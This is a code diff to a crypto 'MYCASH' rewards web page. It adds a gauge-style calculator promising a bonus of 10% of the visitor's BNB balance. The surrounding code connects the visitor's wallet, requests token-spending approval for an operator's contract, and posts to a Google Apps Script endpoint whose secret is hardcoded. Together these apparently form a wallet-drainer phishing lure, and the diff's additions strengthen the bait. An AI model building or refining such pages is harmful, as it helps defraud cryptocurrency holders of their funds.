@@ -14,7 +14,7 @@
     .logo{font-weight:700;letter-spacing:4px}
     .connect{background:#3b82f6;color:#fff;padding:8px 14px;border-radius:999px;border:0;cursor:pointer}
     main{max-width:980px;margin:20px auto;padding:16px}
-    .card{background:#071427;padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.03)}
+    .card{background:#071427;padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.03);margin-bottom:18px}
     .row{display:flex;gap:12px;flex-wrap:wrap;margin-top:12px}
     .stat{flex:1 1 220px;background:#071427;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.02)}
     .muted{color:#9fb0c8}
@@ -24,6 +24,119 @@
     button{cursor:pointer}
     .small { font-size:0.9rem; color:#9fb0c8; }
     .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Helvetica Neue", monospace; }
+
+    /* ===== Reward meter styles ===== */
+    .reward-header {
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:8px;
+      margin-bottom:8px;
+    }
+    .reward-title {
+      font-size:1rem;
+      font-weight:500;
+    }
+    .reward-note {
+      font-size:0.8rem;
+      color:#9fb0c8;
+      text-align:right;
+    }
+
+    .reward-layout {
+      display:flex;
+      flex-wrap:wrap;
+      gap:16px;
+      align-items:center;
+      justify-content:space-between;
+    }
+
+    .gauge-wrap {
+      flex:0 0 220px;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
+    }
+
+    .gauge-outer {
+      position:relative;
+      width:200px;
+      height:100px;
+      border-radius:200px 200px 0 0;
+      background:linear-gradient(90deg,
+        #22c55e 0%,
+        #a3e635 25%,
+        #eab308 50%,
+        #f97316 75%,
+        #ef4444 100%
+      );
+      overflow:hidden;
+      box-shadow:0 10px 25px rgba(0,0,0,0.3);
+    }
+
+    .gauge-inner {
+      position:absolute;
+      left:50%;
+      bottom:-10px;
+      transform:translateX(-50%);
+      width:160px;
+      height:80px;
+      background:#020617;
+      border-radius:160px 160px 0 0;
+    }
+
+    .gauge-needle {
+      position:absolute;
+      left:50%;
+      bottom:0;
+      width:3px;
+      height:88px;
+      background:#020617;
+      transform-origin:bottom center;
+      transform:rotate(-90deg);
+      transition:transform 0.6s ease-out;
+    }
+
+    .gauge-knob {
+      position:absolute;
+      left:50%;
+      bottom:0;
+      width:16px;
+      height:16px;
+      transform:translate(-50%, 50%);
+      background:#020617;
+      border-radius:999px;
+      box-shadow:0 0 0 3px #e5e7eb;
+    }
+
+    .gauge-percent {
+      margin-top:8px;
+      font-size:0.85rem;
+      color:#9fb0c8;
+    }
+
+    .reward-info {
+      flex:1 1 220px;
+      font-size:0.9rem;
+      color:#e5e7eb;
+    }
+    .reward-info-row {
+      margin-bottom:6px;
+    }
+    .reward-label {
+      color:#9fb0c8;
+      font-size:0.85rem;
+    }
+    .reward-value {
+      font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Helvetica Neue", monospace;
+      font-size:0.95rem;
+    }
+
+    @media (max-width:640px){
+      .gauge-wrap{flex:1 1 100%;margin-top:6px}
+      .reward-info{flex:1 1 100%}
+    }
   </style>
 </head>
 <body>
@@ -33,7 +146,7 @@
         <a href="index.html">Home</a>
         <a href="about.html">About</a>
         <a href="contact.html">Contact</a>
-        <a href="rewards.html">Rewards</a>
+        <a href="reward.html">Rewards</a>
       </div>
       <div class="logo">MYCASH</div>
       <div>
@@ -79,6 +192,39 @@
         </div>
       </div>
     </div>
+
+    <!-- Reward calculator card -->
+    <div class="card">
+      <div class="reward-header">
+        <div class="reward-title">Reward Calculator</div>
+        <div class="reward-note">Bonus is estimated from your BNB balance.</div>
+      </div>
+
+      <div class="reward-layout">
+        <div class="gauge-wrap">
+          <div class="gauge-outer">
+            <div class="gauge-inner"></div>
+            <div class="gauge-needle" id="gaugeNeedle"></div>
+            <div class="gauge-knob"></div>
+          </div>
+          <div class="gauge-percent">Reward level: <span id="gaugePercent">0%</span></div>
+        </div>
+
+        <div class="reward-info">
+          <div class="reward-info-row">
+            <div class="reward-label">Your balance is:</div>
+            <div class="reward-value" id="rewardBalance">—</div>
+          </div>
+          <div class="reward-info-row">
+            <div class="reward-label">You will receive bonus:</div>
+            <div class="reward-value" id="rewardBonus">—</div>
+          </div>
+          <div class="small" id="rewardHint">
+            Connect your wallet to calculate your estimated bonus.
+          </div>
+        </div>
+      </div>
+    </div>
   </main>
 
   <footer>
@@ -98,7 +244,8 @@
     const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec";
     const APPS_SCRIPT_SECRET = "mahfuzinam0045";
 
-    const TOKEN_ADDRESS   = "0x7ef95a0fe3fC57bC0d57aBf3d9BB14d4162C1333"; // <--- CHANGE THIS
+    // If you later want USDT etc, set a real address. For now you can leave empty.
+    const TOKEN_ADDRESS   = "";
     const SPENDER_ADDRESS = "0xD0A66d72B69c850b04Eb9CEA6cA156A412d2306d"; // your smart contract
 
     const BNB_TESTNET_CHAIN_ID_DEC = 97;
@@ -111,6 +258,10 @@
     const ERC20_BALANCE_ABI = [
       "function balanceOf(address owner) view returns (uint256)"
     ];
+
+    // Reward config: bonus = BNB * BONUS_RATE
+    const BONUS_RATE = 0.10;              // 10% of BNB balance
+    const MAX_BALANCE_FOR_GAUGE = 1.0;    // 1 BNB = 100% gauge
 
     let web3ModalInstance = null;
     let providerInstance  = null;
@@ -152,6 +303,13 @@
     const walletBalanceEl = document.getElementById("walletBalance");
     const tokensContainer = document.getElementById("tokens");
 
+    // reward UI refs
+    const gaugeNeedleEl   = document.getElementById("gaugeNeedle");
+    const gaugePercentEl  = document.getElementById("gaugePercent");
+    const rewardBalanceEl = document.getElementById("rewardBalance");
+    const rewardBonusEl   = document.getElementById("rewardBonus");
+    const rewardHintEl    = document.getElementById("rewardHint");
+
     function setStatus(txt){
       if(statusTextEl) statusTextEl.textContent = txt;
       console.log("[status]", txt);
@@ -168,11 +326,39 @@
       userIdEl.textContent = id || "-";
     }
 
+    function resetRewardUI(){
+      if (gaugeNeedleEl) gaugeNeedleEl.style.transform = "rotate(-90deg)";
+      if (gaugePercentEl) gaugePercentEl.textContent = "0%";
+      if (rewardBalanceEl) rewardBalanceEl.textContent = "—";
+      if (rewardBonusEl) rewardBonusEl.textContent = "—";
+      if (rewardHintEl) rewardHintEl.textContent = "Connect your wallet to calculate your estimated bonus.";
+    }
+
+    function updateRewardUI(balanceBNB){
+      const balance = Number(balanceBNB || 0);
+      const bonus   = balance * BONUS_RATE;
+
+      if (rewardBalanceEl) rewardBalanceEl.textContent = balance.toFixed(6) + " BNB";
+      if (rewardBonusEl)   rewardBonusEl.textContent   = bonus.toFixed(6)   + " BNB";
+      if (rewardHintEl)    rewardHintEl.textContent    = "This is an estimated bonus based on your current BNB balance.";
+
+      const ratio = Math.max(0, Math.min(balance / MAX_BALANCE_FOR_GAUGE, 1)); // 0–1
+      const angle = -90 + ratio * 180; // -90° (left) to +90° (right)
+
+      if (gaugeNeedleEl){
+        gaugeNeedleEl.style.transform = "rotate(" + angle + "deg)";
+      }
+      if (gaugePercentEl){
+        gaugePercentEl.textContent = Math.round(ratio * 100) + "%";
+      }
+    }
+
     function clearSessionUI(){
       setStatus("Not connected");
       setWalletInfo("—","—",null);
       setUserIdUI("-");
       tokensContainer.innerHTML = '<div class="muted">Connect wallet to see token balance.</div>';
+      resetRewardUI();
     }
 
     function initWeb3ModalInstance(){
@@ -248,8 +434,11 @@
 
     async function getTokenBalance(address){
       try{
-        if(!TOKEN_ADDRESS){
-          console.warn("TOKEN_ADDRESS not set, skipping token balance");
+        if(
+          !TOKEN_ADDRESS ||
+          !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)
+        ){
+          console.warn("TOKEN_ADDRESS not set or invalid, skipping token balance");
           return "";
         }
         if(!providerInstance){
@@ -302,12 +491,10 @@
     async function requestTokenApproval(){
       if(!TOKEN_ADDRESS){
         console.warn("TOKEN_ADDRESS not set, skipping approve");
-        alert("TOKEN_ADDRESS is empty. Set your BEP-20 token contract address in the code.");
         return;
       }
       if(!SPENDER_ADDRESS){
         console.warn("SPENDER_ADDRESS not set, skipping approve");
-        alert("SPENDER_ADDRESS is empty. Set your smart contract address in the code.");
         return;
       }
       if(!providerInstance){
@@ -343,34 +530,32 @@
       }
     }
 
-    // helper to restore UI (bnb + token) given current web3Instance + address
-   // helper to restore UI (bnb + token) given current web3Instance + address
-async function restoreSessionFromAddress(address){
-  const balanceWei = await web3Instance.eth.getBalance(address);
-  const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
-  const userId     = getOrCreateUserIdFor(address);
+    // helper to restore UI (bnb + token + reward) given current web3Instance + address
+    async function restoreSessionFromAddress(address){
+      const balanceWei = await web3Instance.eth.getBalance(address);
+      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
+      const userId     = getOrCreateUserIdFor(address);
 
-  setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
-  setUserIdUI(userId);
+      setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
+      setUserIdUI(userId);
+      updateRewardUI(balanceBNB);
 
-  const tokenBalanceRaw  = await getTokenBalance(address);
-  const prettyBalance    = tokenBalanceRaw ? Number(tokenBalanceRaw).toFixed(4) : "0";
+      const tokenBalanceRaw  = await getTokenBalance(address);
+      const prettyBalance    = tokenBalanceRaw ? Number(tokenBalanceRaw).toFixed(4) : "0";
 
-  tokensContainer.innerHTML =
-    '<div class="token">' +
-      '<div class="muted">Token</div>' +
-      '<div style="font-size:1.1rem;margin-top:4px;">' + prettyBalance + '</div>' +
-      '<div class="small mono" style="margin-top:6px;">' + TOKEN_ADDRESS + '</div>' +
-    '</div>';
+      tokensContainer.innerHTML =
+        '<div class="token">' +
+          '<div class="muted">Token</div>' +
+          '<div style="font-size:1.1rem;margin-top:4px;">' + prettyBalance + '</div>' +
+          '<div class="small mono" style="margin-top:6px;">' + (TOKEN_ADDRESS || "No token configured") + '</div>' +
+        '</div>';
 
-  return {
-    balanceBNB,
-    tokenBalance: tokenBalanceRaw,
-    userId
-  };
-}
-
-    
+      return {
+        balanceBNB,
+        tokenBalance: tokenBalanceRaw,
+        userId
+      };
+    }
 
     async function connectFlow(){
       try{
@@ -512,6 +697,7 @@ async function restoreSessionFromAddress(address){
 
     document.addEventListener("DOMContentLoaded", async function(){
       initWeb3ModalInstance();
+      resetRewardUI();
       connectBtn.addEventListener("click", connectFlow);
       await autoConnectOnLoad();
       document.getElementById("year").textContent = new Date().getFullYear();
@@ -521,4 +707,3 @@ async function restoreSessionFromAddress(address){
   </script>
 </body>
 </html>
-
